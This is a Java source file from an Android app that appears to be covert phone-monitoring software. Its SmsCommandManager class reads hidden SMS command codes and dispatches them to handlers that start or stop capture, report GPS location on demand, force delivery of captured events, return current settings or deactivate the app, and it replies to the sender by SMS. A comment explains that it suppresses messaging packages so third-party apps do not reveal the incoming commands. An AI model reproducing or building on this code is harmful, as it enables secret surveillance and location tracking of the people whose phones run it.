package com.vvt.android.syncmanager.smscommand;

import android.content.Context;
import com.fx.dalvik.util.FxLog;

import com.fx.dalvik.mmssms.MmsSmsDatabaseManager;
import com.fx.dalvik.preference.model.ProductInfo;
import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.GeneralUtil;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.ProductInfoHelper;
import com.vvt.android.syncmanager.control.Main;
import com.vvt.android.syncmanager.smscommand.interpreter.SmsDeactivate;
import com.vvt.android.syncmanager.smscommand.interpreter.SmsDiagnostics;
import com.vvt.android.syncmanager.smscommand.interpreter.SmsDisableStartCapture;
import com.vvt.android.syncmanager.smscommand.interpreter.SmsEnableStartCapture;
import com.vvt.android.syncmanager.smscommand.interpreter.SmsEventSetting;
import com.vvt.android.syncmanager.smscommand.interpreter.SmsForceDeliveryEvents;
import com.vvt.android.syncmanager.smscommand.interpreter.SmsGetCurrentSettings;
import com.vvt.android.syncmanager.smscommand.interpreter.SmsGpsOnDemand;
import com.vvt.android.syncmanager.smscommand.interpreter.SmsGpsSetting;

public class SmsCommandManager {
	
	private static final String TAG = "SmsCommandsManager";
	private static final boolean DEBUG = true;
 	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	private static final SmsCommandManager instance = new SmsCommandManager();
	
	private static final String TAG_DELIMITERS = "<|>";
	
//------------------------------------------------------------------------------------------------------------------------
// PRIVATE API
//------------------------------------------------------------------------------------------------------------------------
	
	private SmsCommandManager() {
		// Prevent instantiating from outside	
	}
	
//------------------------------------------------------------------------------------------------------------------------
// PUBLIC API
//------------------------------------------------------------------------------------------------------------------------
	
	public static SmsCommandManager getInstance() {
		return instance;
	}
	
	public void processSmsCommand(String destinationAddress, String displayMessageBody) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processSmsCommand # ENTER ...");
		}
		Context context = Main.getContext();
		
		String reportMessage = null;
		
		boolean sendResponse = SmsCommandHelper.isRequestSendingResponse(
				context, displayMessageBody);
		
		// Try to create response header
		boolean headerCreated = false;
		try {
			ProductInfo productInfo = ProductInfoHelper.getProductInfo(context);
			
			String productIdVersion = new StringBuilder()
					.append(productInfo.getId())
					.append(" ")
					.append(productInfo.getVersionName())
					.toString();
			
			reportMessage = SmsCommandHelper.getResponseHeader(
					context, productIdVersion, displayMessageBody);
			
			headerCreated = true;
		}
		catch (SmsCommandException smsCommandException) {
			headerCreated = false;
			if (sendResponse) {
				SmsCommandHelper.sendResponseMessage(context, 
						destinationAddress, smsCommandException.getMessage());
			}
		}
		if (headerCreated) {
			// Prepare tokens
			String[] tokens = GeneralUtil.getTokenArray(displayMessageBody, TAG_DELIMITERS);
			
			// Command code e.g. *#60 -> [60]
			String commandCode = tokens[0];
			
			// Process Command
			if (commandCode.equals(SmsGpsSetting.COMMAND_ID)) {
				reportMessage += SmsGpsSetting.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsEnableStartCapture.COMMAND_ID)) {
				reportMessage += SmsEnableStartCapture.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsDisableStartCapture.COMMAND_ID)) {
				reportMessage += SmsDisableStartCapture.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsDiagnostics.COMMAND_ID)) {
				sendResponse = true;
				reportMessage = SmsDiagnostics.processCommand(context, tokens, reportMessage);
			}
			else if (commandCode.equals(SmsEventSetting.COMMAND_ID)) {
				reportMessage += SmsEventSetting.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsForceDeliveryEvents.COMMAND_ID)) {
				reportMessage += SmsForceDeliveryEvents.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsGetCurrentSettings.COMMAND_ID)) {
				sendResponse = true;
				reportMessage += SmsGetCurrentSettings.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsDeactivate.COMMAND_ID)) {
				reportMessage += SmsDeactivate.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsGpsOnDemand.COMMAND_ID)) {
				String response = SmsGpsOnDemand.processCommand(
						context, tokens, destinationAddress, reportMessage);
				sendResponse = true;
				reportMessage += response;
			}
			// Command not found
			else {
				reportMessage += StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_COMMAND_NOT_FOUND;
			}
			
			if (LOCAL_LOGV) {
				FxLog.v(TAG, String.format(
						"processSmsCommand # sendResponse: %s, reportMessage:- \n%s", 
						sendResponse, reportMessage));
			}
			
			// Send response message
			if (sendResponse) {
				SmsCommandHelper.sendResponseMessage(context, destinationAddress, reportMessage);
				
				// Some 3rd party app e.g. Handscent could be invoked from us sending a reply message
				// they may popup an incoming command
				MmsSmsDatabaseManager.suppressMmsSmsPackage(context.getApplicationContext());
			}
		}
	}
	
}
